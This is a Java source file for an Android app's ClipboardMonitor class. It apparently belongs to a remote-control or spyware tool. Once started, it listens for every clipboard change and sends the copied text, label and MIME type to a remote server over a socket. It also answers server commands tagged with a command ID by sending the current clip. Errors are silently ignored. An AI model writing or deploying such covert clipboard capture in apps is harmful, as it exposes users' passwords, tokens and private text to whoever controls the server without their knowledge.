package com.fason.app.features.clipboard;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONObject;
import io.socket.client.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public final class ClipboardMonitor {
    private static final String TAG = "ClipboardMonitor";
    private static final long MIN_EMIT = 1000;
    private static ClipboardMonitor instance;
    private final Context ctx;
    private final Handler handler;
    private ExecutorService exec;
    private ClipboardManager mgr;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private volatile String lastText;
    private volatile long lastEmit = 0;
    private ClipboardManager.OnPrimaryClipChangedListener clipListener;

    private ClipboardMonitor(Context context) {
        this.ctx = context.getApplicationContext();
        this.handler = new Handler(Looper.getMainLooper());
        this.exec = Executors.newSingleThreadExecutor();
        this.clipListener = () -> {
            if (!running.get()) return;
            try {
                exec.execute(() -> emit(false, null));
            } catch (Exception e) {
                Log.w(TAG, "Clip change rejected", e);
            }
        };
    }

    public static synchronized ClipboardMonitor getInstance(Context context) {
        if (instance == null) {
            instance = new ClipboardMonitor(context);
        }
        return instance;
    }

    private void ensureExec() {
        if (exec == null || exec.isShutdown()) {
            exec = Executors.newSingleThreadExecutor();
        }
    }

    public synchronized void start() {
        ensureExec();
        if (running.getAndSet(true)) return;
        if (mgr == null) {
            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }
        if (mgr == null) {
            running.set(false);
            return;
        }
        try {
            mgr.addPrimaryClipChangedListener(clipListener);
        } catch (Exception ignored) {}
        try {
            exec.execute(() -> emit(true, null));
        } catch (Exception e) {
            Log.w(TAG, "Start rejected", e);
        }
    }

    public synchronized void stop() {
        if (!running.getAndSet(false)) return;
        if (mgr != null) {
            try { mgr.removePrimaryClipChangedListener(clipListener); } catch (Exception ignored) {}
        }
        lastText = null;
    }

    public void emit(String cmdId) {
        ensureExec();
        try {
            exec.execute(() -> emit(true, cmdId));
        } catch (Exception e) {
            Log.w(TAG, "Emit rejected", e);
        }
    }

    private void emit(boolean allowDup, String cmdId) {
        if (mgr == null) {
            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }
        if (mgr == null) return;
        try {
            if (!mgr.hasPrimaryClip()) {
                if (cmdId != null && !cmdId.isEmpty()) {
                    JSONObject ack = new JSONObject();
                    ack.put(Protocol.KEY_TEXT, "");
                    ack.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                    ack.put(Protocol.KEY_LENGTH, 0);
                    attachCmdId(ack, cmdId);
                    Socket socket = SocketClient.getInstance().getSocket();
                    if (socket != null) socket.emit(Protocol.CLIPBOARD, ack);
                }
                return;
            }
            ClipData clip = mgr.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;
            CharSequence text = clip.getItemAt(0).getText();
            if (TextUtils.isEmpty(text)) return;
            String s = text.toString();
            if (!allowDup && s.equals(lastText)) return;
            long now = System.currentTimeMillis();
            if (!allowDup && (now - lastEmit) < MIN_EMIT) return;
            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_TEXT, s);
            data.put(Protocol.KEY_TIMESTAMP, now);
            data.put(Protocol.KEY_LENGTH, s.length());
            if (clip.getDescription() != null) {
                data.put(Protocol.KEY_LABEL, clip.getDescription().getLabel());
                data.put(Protocol.KEY_MIME_TYPE, clip.getDescription().getMimeType(0));
            }
            attachCmdId(data, cmdId);
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null) socket.emit(Protocol.CLIPBOARD, data);
            lastText = s;
            lastEmit = now;
        } catch (Exception ignored) {}
    }

    private void attachCmdId(JSONObject obj, String cmdId) {
        if (cmdId != null && !cmdId.isEmpty()) {
            try { obj.put(Protocol.KEY_CMD_ID, cmdId); } catch (Exception ignored) {}
        }
    }

    public boolean isRunning() {
        return running.get();
    }

    public void shutdown() {
        stop();
        if (exec != null && !exec.isShutdown()) {
            exec.shutdown();
        }
    }
}
